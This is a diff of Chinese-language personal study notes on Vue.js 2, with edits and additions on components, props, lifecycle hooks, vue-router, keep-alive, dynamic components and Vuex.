-filters: {
-  过滤器函数(value, 第二个参数) {
-    return 函数内部需要返回值;
+  filters: {
+    过滤器函数(value, 第二个参数) {
+      return 函数内部需要返回值;
+    }
   }
-}
 <!-- 
   当解析的时候 过滤器函数的返回值 会替换掉 {{value | 过滤器函数}} 整个部分
  -->
@@ -3557,10 +3631,14 @@ filters: {
 ### 数组中哪些方法是响应式的
 > 可以做到响应式的方法
 - 1. push()
-<!-- push('aaa', 'bbb', 'ccc') 这个方法是可以添加多个元素的 -->
+<!-- 
+  push('aaa', 'bbb', 'ccc') 这个方法是可以添加多个元素的 
+-->
+
 - 2. pop()
 - 3. unshift()
 - 4. shift()
+
 - 5. splice()
 <!-- 
   需求 替换 3 4 5 为 6 7 8 
@@ -3569,6 +3647,7 @@ filters: {
   从索引为2的开始 删除3个 追加3个元素
   app.splice(2, 3, 6, 7, 8)
  -->
+
 - 6. sort()
 - 7. reverse()
 
@@ -3604,6 +3683,7 @@ filters: {
   }
  -->
 - 一般情况下 我们在制作的表格的时候 里面的内容都不是写死的, 而是从哪获取的数据动态的生成的表格, 这里我们要用v-for来遍历这个数组
+
 - 我们在tr上v-for 因为一本书就是一行, 对于每一行的单元格的遍历 我们有两种方式
 
 - 方式1:
@@ -3626,6 +3706,10 @@ filters: {
     <td><button>移除</button></td>
   </tr>
  -->
+
+- 总结：
+- 当我们要对局部的结构操作的时候 那么手动创建结构 然后依次填入数据
+- 不要渲染整个tr结构 这样没办法操作td
 
 
 > 保留两位小数, price前面添加符号的方法
@@ -3670,6 +3754,9 @@ filters: {
   我们就要在v-for遍历books的时候, (item, index) 把这个index 通过 @click='increment(index) 函数调用的方式传递给methods中的函数 
 -->
 
+- 要点: 
+- :disabled='item.count <= 1'
+- 下面还利用了 共同变量 index 即操作按钮也能操作数组
 <!-- 
   <button @click='decrement(index)' :disabled='item.count <= 1'>-</button>
   <button @click='increment(index)'>+</button>
@@ -3735,6 +3822,7 @@ filters: {
   }
  -->
 >>> 这里有个问题 我的疑惑是 在计算属性里 for循环遍历 遍历的不是data中的books数据么? 按我的理解应该是计算出了data中的price的总价格, 但实际上确实跟页面上的数据挂钩了 我点加 减都会改变总价格 为什么???
+- 因为是计算属性 计算属性中的一个要素发生了变化都会解析整个计算属性
 
 > 完整的代码部分:
 <!-- 
@@ -3820,6 +3908,8 @@ filters: {
   <transition>
     <h1 v-show='isShow'>你好啊</h1>
   <transition>
+
+  // 然后我们通过 isShow 属性 控制元素的显示和隐藏看看能不能触发过渡的效果
  -->
 
 - 属性：
@@ -3970,7 +4060,7 @@ filters: {
 
 
 > 流程图
-<!-- 
+
                        new Vue()
                           ↓
                 Init Event & Lifecycle
@@ -4053,15 +4143,16 @@ filters: {
 
         注意 在此阶段对数据的操作 页面都不会再更新了
 
-  此时： vm中所有的 data methods 指令等等都处于可用状态 马上要执行销毁过程 
-  一般在此阶段 关闭定时器 取消订阅消息 解绑自定义事件等收尾动作
+  此时： 
+      vm中所有的 data methods 指令等等都处于可用状态 马上要执行销毁过程 
+        一般在此阶段 关闭定时器 取消订阅消息 解绑自定义事件等收尾动作
 
                           ↓
 
                       destroyed
                      (生命周期函数)
 
- -->
+
 
 
 
@@ -4097,7 +4188,9 @@ filters: {
 > updated（更新后）
 - 当页面发生更新的时候会调用这个函数
 <!-- 
-  比如我们的组件data中有message数据, 我把这个message数据放到组件的模板里面{{message}}, 因为这个是动态的, 假如data中的数据发生改变的时候, 页面就会刷新为了显示最新的数据
+  比如我们的组件data中有message数据, 
+  我把这个message数据放到组件的模板里面{{message}}, 因为这个是动态的, 
+  假如data中的数据发生改变的时候, 页面就会刷新为了显示最新的数据
 
   只要界面一更新完的时候就会执行这个updated()函数
  -->
@@ -4166,8 +4259,8 @@ filters: {
 
 > 另一种生命周期函数
 > this.$nextTick(() => { })
-- nextTick 有下一轮的意思 所以是一次重新渲染模板之后再执行回调的逻辑
-- 当页面上元素被重新渲染之后才会执行回调中的代码
+- nextTick 有下一轮的意思 所以是*一次重新渲染模板之后*再执行回调的逻辑
+- *当页面上元素被重新渲染之后才会执行回调中的代码*
 
 - 它会在DOM重新渲染完毕 解析完毕之后执行内部的回调 它能确保我们得到了最新的DOM节点后 再去对节点进行操作
 
@@ -4578,7 +4671,7 @@ filters: {
 
 
 > 总结
-- 1. Student组件本质是一个名我VueComponent的构造函数 且不是程序员定义的 是Vue.extend生成的
+- 1. Student组件本质是一个名为VueComponent的构造函数 且不是程序员定义的 是Vue.extend生成的
 
 - 2. 我们只需要写<Student /> vue在解析的时候就会帮我们创建Student组件的实例对象 即vue帮我们执行的 new VueComponent() 
 
@@ -4651,7 +4744,7 @@ filters: {
     school.vue  /  School.vue
     
   多个单词的 组件名
-    MySchool.vue  /  my-school.vue
+    my-school.vue  /  MySchool.vue
  -->
 
 
@@ -4689,7 +4782,7 @@ filters: {
 
 
 > 要点：
-- 1. 我们一般采用的是 默认暴露的方式 因为引入文件的时候好整
+- 1. 我们一般采用的是 默认暴露的方式 因为引入文件的时候方便调用者起名字
 - 2. export default 直接暴露 组件的配置对象
 <!-- 
   正常我们创建组件的时候会使用 Vue.extend({ })
@@ -4833,7 +4926,7 @@ filters: {
 ### 配置项：mixins  混入 / 混合
 - 所谓的混入就是当组件中的一个部分完全一样的时候 我们可以将这个部分抽离出来 在各自的组件中删除代码 引入抽离的文件
 
-- 也就是说两个组件共享一个配置 复用配置
+- 也就是说两个组件共享一个配置 复用配置项
 
 > 对于data 和 methods来说
   当混合文件中有 组件内部没有的时候 以混合文件为主
@@ -4841,6 +4934,7 @@ filters: {
 
 > 对于生命周期函数来说
   没有上面的说法 混合文件中的 和 组件中的都会调用
+  -- 那是不是说 生命周期就不要写在 混合文件里面了 -- 
 
 
 > 使用场景
@@ -4963,6 +5057,22 @@ filters: {
 - 一般App要是写样式了 代表所有组件都会用的
 
 
+> deep 的使用方式
+- 一般在使用scoped后 父组件的样式将不会渗透到子组件中 而我们调用的element组件就相当于在父组件中使用子组件
+- 这时候我们想改变element组件的部分样式时 就要在class类名前加上 /deep/ 或者 >>> 或者 ::v-deep
+- .(外层class) >>> .(内层class)
+
+- vue在解析样式的时候会在类名的后面加上[vasdf2323]之类的属性 当我们使用 deep 后该属性就会加在外层class上 获取我们修改的样式就会生效
+- .(外层class) .(内层class)[data-v-asfda123]
+- .(外层class) >>> .(内层class)   ---   .(外层class)[data-v-asfda123]  .(内层class)
+
+<!--
+    .table-wrap /deep/ .el-table__header-wrapper .cell {
+      padding-left: 0;
+    }
+-->
+
+
 > <style lang='less'>
 - 我们在写样式的时候 可以使用less 直接这么写标签就可以了
 - 但是需要安装 less-loader
@@ -4990,6 +5100,7 @@ filters: {
 --------------------------
 
 ### Todo案例部分的总结
+
 > 数据放在哪个组件？
 - 我们对页面拆分组件后 要想数据在哪个组件展示 我们就放在哪个组件
 - 也就是
@@ -5017,12 +5128,12 @@ filters: {
  -->
 
 
-> 数据类型中id到底用什么类型的数据比较好？
+> 数据类型中id - 到底用什么类型的数据比较好？
 - 在js中数字型的id是有尽头的 一般都用字符串的类型
 
 
 > 怎么控制 标签内部的属性 有还是没有
-- 或者我们使用三元表达式 
+- 或者我们使用三元表达式
 - 在上面的案例中我们直接去问todo.done就可以
 <!-- 
   <input type='checkbox' :checked='todo.done'>
@@ -5091,7 +5202,8 @@ filters: {
 
 
 > 将用户保存的数据 放在本地存储中
-- 那什么时候往本地存储里面放呢？ 我们使用watch监视属性 只要我们操作了todos那么我就把它放本地存储中放
+- 那什么时候往本地存储里面放呢？ 
+- 我们使用watch监视属性 只要我们操作了todos那么我就把它放本地存储中放
 <!-- 
   data: {
     // todos: []
@@ -5416,7 +5528,7 @@ filters: {
 
 
 > 使用方式1 确认接收方(子组件)的props为数组  简单声明接收
-- 1. 父组件在组件标签内部传递数据
+- 1. 父组件在组件标签内部使用props传递数据
 
 - 父组件在组件标签内传递数据时 有两种书写方式：
     - 1. 可以直接传递      key: value    
@@ -5439,7 +5551,7 @@ filters: {
  -->
 
 
-> 使用方式2 确认接收方(子组件)的props为对象  配合类型限制 和 默认值
+> 使用方式2 子组件的props的对象写法  配合类型限制 和 默认值
 - 父组件传递数据的部分和上面的相同 但是在接收的同时可以对数据的类型做限制
 
 > 简单的类型限制
@@ -5475,6 +5587,7 @@ filters: {
     }
   }
  -->
+
 - 当 type 为 Array Object 的时候 default必须是一个函数且返回值就是默认值
 <!-- 
   props: {
@@ -5607,7 +5720,7 @@ filters: {
   }
  -->
 
-- 5. props的优先级高 它会覆盖掉data computed里面的同名数据
+- 5. *props的优先级高 它会覆盖掉data computed里面的同名数据*
 
 --------------------------
 
@@ -5616,7 +5729,7 @@ filters: {
 - 有些时候 我们需要子组件向父组件传递数据 那么怎么做呢
 
 > 1. 利用props向子组件先传递函数 
-> 2. 子组件将数据通过实参传递到函数里 父组件通过形参接收
+> 2. 子组件将数据通过实参传递到函数里 父组件通过形参接收 然后父组件做处理
 
 - 1. 父组件中定义函数准备接收数据
 - 2. 父组件将定义的函数使用props的方式发送到子组件
@@ -5712,9 +5825,8 @@ filters: {
 
 
 **注意问题**
-- 1. 我们接收子组件通过自定义事件传递过来的数据的时候 要将数据保存在data中 然后我们才能在模板中使用
+- 我们接收子组件通过自定义事件传递过来的数据的时候 要将数据保存在data中 然后我们才能在模板中使用
   
-
 
 > 应用场景
 - 比如 现在一个网页中的分类侧边栏 里面有很多的选项
@@ -5726,9 +5838,11 @@ filters: {
     美容护肤
 
 <!-- 
-  - 像在这个小组件上的数据 其实都是从服务器获取的吧, 也就是说 我们外层最大的组件发送请求 将获取到的数组 传递给这个子组件, 在子组件中展示
+  - 像在这个小组件上的数据 其实都是从服务器获取的吧, 
+  也就是说 我们外层最大的组件发送请求 将获取到的数组 传递给这个子组件, 在子组件中展示
 
-  - 但是这时候 因为里面有很多的选项, 比如页面上来的内容 属于 热门推荐里面的 这时我 点击了 手机数码, 应该显示手机数码里的内容了
+  - 但是这时候 因为里面有很多的选项, 
+  比如页面上来的内容 属于 热门推荐里面的 这时我 点击了 手机数码, 应该显示手机数码里的内容了
 
   - 这时候就要告诉父组件 子组件点击了谁 子组件里有很多的类别 我到底点击了哪一个类别呢
   - 如果我点击了 手机数码的类型, 父组件知道了后应该请求手机数码的数据 
@@ -5836,7 +5950,6 @@ filters: {
 - 上面介绍了两种方式 子组件和父组件之间的通信 
 - 相同点：
 - 父组件中都要配置回调用户接收数据
-
 
 --------------------------
 
@@ -6147,7 +6260,10 @@ num1 = cnum1 = dnum1 界面上显示的是dnum1
 ### 子访问父 $parent
 - 但是我们在实际开发中并不太会使用 $parent 获取数据后使用
 <!-- 
-  因为我们组件型的开发核心是复用性, 也就是说我们开发的一个一个组件可以自由的在任何文件页面内使用, 所以要保持它的独立性, 如果我们使用了$parent的话 组件和组件之间就会相互关联, 不方便复用, 耦合性太高 
+  因为我们组件型的开发核心是复用性, 
+  也就是说我们开发的一个一个组件可以自由的在任何文件页面内使用, 
+  所以要保持它的独立性, 
+  如果我们使用了$parent的话 组件和组件之间就会相互关联, 不方便复用, 耦合性太高 
 -->
 
 <!-- 
@@ -6338,7 +6454,6 @@ num1 = cnum1 = dnum1 界面上显示的是dnum1
 - 数据的接收方：
 - 订阅消息 + 指定回调 ： 如果有人发布了该消息 回调就会被调用
 
-
 - 数据的发送方：
 - 发布消息 发布接收方订阅的消息 + 携带数据 ： 这边部分消息由于接收方订阅了该消息 指定回调中就能接收到数据
 
@@ -6348,7 +6463,7 @@ num1 = cnum1 = dnum1 界面上显示的是dnum1
 
 
 > pubsub.js
-- 我么使用这个库来完成 消息的订阅与发布技术
+- 我们使用这个库来完成 消息的订阅与发布技术
 - 这个库在任何的框架里面都是实现
 <!-- 
   publish：   发布
@@ -6412,8 +6527,8 @@ num1 = cnum1 = dnum1 界面上显示的是dnum1
     3. xxx      3. xxx
  -->
 
-- 然后我们在 父组件里面调用 调用的同时 将父组件中的数据传递给 <Category>组件
-- 我们将对应的数组 和 标题使用props的形式传递过去
+- 然后我们在 父组件里面调用 调用的同时 将父组件中的数据传递给 <Category> 组件
+- 我们将对应的 数组 和 标题 使用props的形式传递过去
 <!-- 
   // 父组件
   data: {
@@ -6560,7 +6675,8 @@ num1 = cnum1 = dnum1 界面上显示的是dnum1
 
 
 > 下面遇到的例子在这里重新补充
-- 插槽<slot>最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性, 我们都要给<slot>包裹一层<div>把上述类似的属性放在这层<div>里
+- 插槽<slot>最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性, 
+- 我们都要给<slot>包裹一层<div>把上述类似的属性放在这层<div>里
 
 - 也就是说插槽<slot name=''>里尽量只有name属性, 其它属性来一层包裹<div>
 <!-- 
@@ -7571,7 +7687,7 @@ allowed in .vue files - render functions are required elsewhere
   比如我们再地址栏上输入 www.taobao.com, 这个地址就会发送到服务器里面
 
   早期的时候, 服务器拿到我们的地址, 会将地址进行解析看看我们要请求什么样的网页
-  服务器会对发送过来的地址进行判断, 比如判断出哦~ 原来请求的是首页
+  服务器会对发送过来的地址进行判断, 比如判断出 哦~ 原来请求的是首页
 
   服务器就会在后台这边通过jsp的技术, 会直接将要请求的网页写好(网页中包含了htmlcssjava的代码, java的代码的作用是从数据库中读取数据并将数据动态的渲染到页面中), 也就是说我们请求的页面在服务器里就已经是一个成品网页了, 然后将这个网页直接发送给浏览器端, 这个网页中的代码只有html和css
 
@@ -7579,7 +7695,7 @@ allowed in .vue files - render functions are required elsewhere
   这个页面也会发送给服务器 服务器也会对这个url进行解析, 然后服务器在后台 通过jsp等技术在后端再次渲染出一个页面, 直接传给前端, 前端展示最终的网页
 
   当页面多的时候, 请求的url和后台渲染的页面会形成一个映射关系 比如
-  taobao    --- 渲染出来的淘宝页面
+  taobao   --- 渲染出来的淘宝页面
   淘宝男装  --- 渲染出来的淘宝男装页面
   淘宝女装  --- 渲染出来的淘宝女装页面
 
@@ -7740,7 +7856,7 @@ allowed in .vue files - render functions are required elsewhere
 
 --------------------------
 
-### url的hash和html5的history
+### url的hash 和 html5的history
 - 上面介绍了前端路由的概念, 它的核心就是改变url的时候让页面不要刷新
 <!-- 
   因为只要改变了地址栏里的url默认 它会重新向服务器请求资源, 但现在我不让它刷新, 因为我要让它在前端这边改变
@@ -7852,6 +7968,67 @@ allowed in .vue files - render functions are required elsewhere
 
 --------------------------
 
+### 动态组件
+- 应用场景
+- tabs选项卡下 点击不同的tabs按钮展示不同的组件
+
+- 作用:
+- 让多个组件使用同一个挂载点，并动态切换，这就是动态组件。
+- 有的时候，在不同组件之间进行动态切换是非常有用的，比如在一个多标签的界面里：
+<!-- 
+      -------     -------   -------
+      Home        Login     Categroy
+      -----------------------------
+
+        组件区域 <component> 
+
+      -----------------------------
+ -->
+
+> <component :is="pageView"> 元素
+- <component> 的作用相当于 router-view 用于呈现组件的区域
+- 我们通过 :is 属性 绑定对应的组件
+
+- 比如完成上述的 点击tabs按钮展现不同的组件 可以这样
+<!-- 
+  // 1. 引入组件
+  import Home from "./components/Child/Home.vue"
+  import Login from "./components/Child/Login.vue"
+  import Categroy from "./components/Child/Categroy.vue"
+
+
+  // 2. 在合适的位置使用 <component> 元素
+  <div id="app">
+    <button @click="changePage">切换页面</button>
+    <component :is="pageView"></component>
+  </div>
+
+
+  // 3. :is 这里我 绑定组件
+  - 我们动态的从组件数组中获取组件
+  data() {
+    return {
+      index: 0,
+      arr: [Home, Login, Categroy], 
+  },
+
+  // 
+  computed: {
+    pageView() {
+      return this.arr[this.index]
+    }
+  }
+
+  // 
+  methods: {
+    changePage() {
+      this.index = (++this.index) % 3
+    }
+  },
+ -->  
+
+--------------------------
+
 ### 路由router
 - 对于路由的理解 可以理解为 路由器和每一台电脑之间的关系 比如路由器后面的接口 就会对应着一台电脑
 - 那么接口和电脑之间的关系就相当于一组组的key + value = 一组路由
@@ -7873,9 +8050,9 @@ allowed in .vue files - render functions are required elsewhere
 
 > 路由的概念 router
 - 所谓的路由就是一组key-value的对应关系 多个路由需要经过路由器的管理
-- router会监测/user的变化 然后显示对应的组件
+- router会监测path的变化 当发现符合规则的 路径时/user 就显示对应的组件
 
-- vue-router是一个插件库 专用用来实现spa的应用 ¥
+- vue-router是一个插件库 专用用来实现spa的应用
 <!-- 
  spa中的数据需要通过ajax来获取
  -->
@@ -7918,7 +8095,7 @@ allowed in .vue files - render functions are required elsewhere
 - 在index.js文件中引入我们下载的vue-router并通过它创建路由器
 
 - 注意：
-- 入口js文件 和 路由配置文件都要导入 VueRouter
+- 入口js文件 和 路由配置文件都要导入 VueRouter from 'vue-router'
 <!-- 
   import VueRouter from 'vue-router'
 
@@ -7949,7 +8126,6 @@ allowed in .vue files - render functions are required elsewhere
 
 
   // 上面将routes配置到了VueRouter配置项里面 还可以这样
-
   const routes = [
     这里面匹配映射关系, 一个url映射一个组件...
   ]
@@ -7974,6 +8150,7 @@ allowed in .vue files - render functions are required elsewhere
 
 > 5. 展示路由 和 路由跳转
 - 要使用 <router-view> <router-link>
+- 当路径发生变化都要展示对应的组件 所以必须要有 <router-view>
 
 --------------------------
 
@@ -8067,6 +8244,7 @@ allowed in .vue files - render functions are required elsewhere
 
 > name: ‘’
 - 配置该路由信息的别名
+
 - 作用：
 - 让我们在多级路由跳转的时候简化编码
 - 使用name的时候 要使用v-bind to 还要配合{}使用
@@ -8107,11 +8285,12 @@ allowed in .vue files - render functions are required elsewhere
  -->
 
 
-> 路由文件中的props
+> props(路由文件中的配置项)
 - 下面的写法三选1
-- 对象 是路由配置文件传递的死数据传递到props中
-- 布尔值 是把params参数传递到props中
 
+- 1. 对象 是路由配置文件传递的死数据传递到props中
+- 2. 布尔值 是把params参数传递到props中
+- 3. 函数
 
 > 1. props的对象写法
 - 对象写法 给该组件传递的是死数据 写死的
@@ -8432,7 +8611,7 @@ allowed in .vue files - render functions are required elsewhere
 - 当前路由的 hash 值 (不带 #) ，如果没有 hash 值，则为空字符串。锚点
 
 - 5. $route.fullPath
-- 完成解析后的 URL，包含查询参数和 hash 的完整路径。
+- 完成解析后的 URL，包含查询参数和 hash 的完整路径。  如 "/foo/bar"。
 
 - 6. $route.matched
 - 数组，包含当前匹配的路径中所包含的所有片段所对应的配置参数对象。
@@ -8448,6 +8627,19 @@ allowed in .vue files - render functions are required elsewhere
 - 页面上有3个按钮 我们点击按钮 展示该按钮对应的详情
 - 但是详情页面只是一个组件 也就是我们 我们要用这一个组件展示3个按钮对应的不同内容
 - 比如这个展示区要展示 id title
+
+<!-- 
+  这里做下记录
+  ----
+    动态组件 是一个区域展示不同的组件 通过 <component :is="组件">
+      URL不会改变
+
+    这个案例中是 展示区就是一个组件 但是要展示不同的内容 那就需要在跳转路由的时候进行数据的传递
+      那就会有一个问题
+      - 跳转到指定页面后 数据是通过传参的方式展现 还是 请求数据的方式展现
+
+      - 我觉得请求的方式比较好
+ -->
 
 - 思路：
 - 由于数据在按钮的组件当中 那我们是不是可以在点击按钮的时候 向路由组件传递数据 将详情组件想要展示的东西传递过去
@@ -8670,11 +8862,11 @@ allowed in .vue files - render functions are required elsewhere
 
 --------------------------
 
-### 缓存路由组件 <keep-alive>
+### 缓存路由组件 <keep-alive> (组件缓存)
 - 作用：
 - 让不展示的路由组件保持挂载 不被销毁
 
-- 有这么一个场景 一个注册页面 我们填写完了很多的信息 然后点击按年切换到了别的页面
+- 有这么一个场景 一个注册页面 我们填写完了很多的信息 然后点击按钮切换到了别的页面
 - 这时候我们再回来发现我们写的信息都没有了
 <!-- 
   因为跳转到另一个页面 前一个组件就会被销毁 我们回退回去之后它属于重新生成
@@ -8697,6 +8889,59 @@ allowed in .vue files - render functions are required elsewhere
 - 放在 keep-alive 里面的状态都会被保存 也就是显示在里面的组件不会被销毁
 - 但是也不是所有的组件被缓存就是好的 我们可以针对那些需要被缓存的项目进行缓存
 - 比如 input
+
+> <keep-alive> 后才有的生命周期
+> 当页面处于活跃状态的时候, 执行该回调
+> activated() { ... }
+
+
+> 当页面不处于活跃状态的时候, 执行该回调
+> deactivated() { ... }
+
+- 实际场景
+- 有一个群友说 一个B页面中的结构只想展现一次 
+- 思路1：
+- 通过定义一个变量 然后通过v-if来决定该结构是否被渲染
+
+- 问题:
+- 什么时候修改这个变量的值
+- 1. 组件销毁
+- 2. 路由守卫
+- 都不行 因为离开当前页面确实是组件销毁了 但是回来后会被重新创建 即使销毁的时候我们修改了flag的值
+- 重新创建的时候也会赋值回来
+
+- 解决方法
+- <keep-alive> + deactivated() { ... }
+<!--  
+  <div id="app">
+    <div>
+      <h3>我是app页面</h3>
+    </div>
+    <hr>
+    <div class="nav">
+      <router-link to="/home">Home</router-link> <br>
+      <router-link to="/login">Login</router-link> <br>
+    </div>
+    <div class="view">
+      <keep-alive>
+        <router-view />
+      </keep-alive>
+    </div>
+  </div>
+
+
+  data() {
+    return {
+      flag: true
+    }
+  },
+
+  // 当该组件失活的时候 修改flag
+  deactivated() {
+    this.flag = false
+    console.log(this.flag)
+  }
+ -->
 
 
 > <keep-alive include=‘字符串或者正则表达式’>
@@ -8881,6 +9126,12 @@ allowed in .vue files - render functions are required elsewhere
 
   也就是说 我们在点击 News Message 的时候我们需要校验一下 看看学校是不是atguigu 如果是再呈现给用户
  -->
+
+- 鉴权
+- 1. 首先把权限数据放入一个公共的位置
+- 比如 vuex localStorage meta
+
+- 2. 点击按钮的时候 我们需要校验下权限
 
 
 > 点击路由按钮后的流程
@@ -9397,6 +9648,7 @@ Vcomponent                   Mutations   ← →   Devtools
   只有在Vue中挂载后 它才会给Vue的原型添加 $store
   其它组件才可以通过 $store 来拿到我们创建的vuex 这样多个组件才能去仓库中取东西 Vue.prototype.$store = store
  -->
+
 <!-- 
   // store文件夹中的 index.js 文件
   该文件用于创建Vuex中最为核心的store
@@ -9810,6 +10062,34 @@ Vue Components                        Mutations         Devtools
 - actions看似没有用处 但是当业务逻辑一复杂 我们在actions里面定义逻辑 这里面的逻辑只有一套 很多组件公用这一套
 - 如果复杂的逻辑放在组件自身 不方便复用
 
+<!-- 
+  // store.js
+  const state = {
+    str: "sam",
+  }
+
+  const actions = {
+    modifyStr(context, value) {
+      context.commit("MODIFY_STR", value)
+    }
+  }
+
+  const mutations = {
+    MODIFY_STR(state, value) {
+      state.str = value
+    }
+  }
+
+
+  // 组件内部
+  changeName() {
+    this.$store.dispatch("modifyStr", "erin")
+  }
+
+
+  actions 和 mutations 的函数中都能收到两个参数 context / state 和 value(组件传递的数据)
+ -->
+
 --------------------------
 
 ### Vuex Store中的 getters 配置项
@@ -9889,8 +10169,8 @@ Vue Components                        Mutations         Devtools
 
 > 方式一： 对象写法
 > mapState({
-  vm变量名: 'vux中想要使用的数据',
-  vm变量名: 'vux中想要使用的数据',
+  我们在组件中想要使用的变量名: 'vux中想要使用的数据',    // v的部分要加上引号
+  我们在组件中想要使用的变量名: 'vux中想要使用的数据',
 })  
 
 - 注意：
@@ -9910,6 +10190,18 @@ Vue Components                        Mutations         Devtools
       subject: 'subject',
     })
   }
+
+  -----
+
+  const state = {
+    str: "sam",
+  }
+
+  computed: {
+    ...mapState({
+      name: "str"
+    })
+  }
  -->
 
 
@@ -9918,7 +10210,7 @@ Vue Components                        Mutations         Devtools
 - 在使用mapState()传递参数的时候 我们还可以传递一个数组进去
 
 - 特点：
-- 1. 当我们想定义的变量名 和 vuex 中的变量名一致的时候我们可以用这种方式
+- 1. 当我们想定义的变量名 和 vuex 中的*变量名一致*的时候我们可以用这种方式
 
 > mapState(['定义映射vuex数据的变量', 'vuex中的数据'])
 - 也是使用...放在computed中
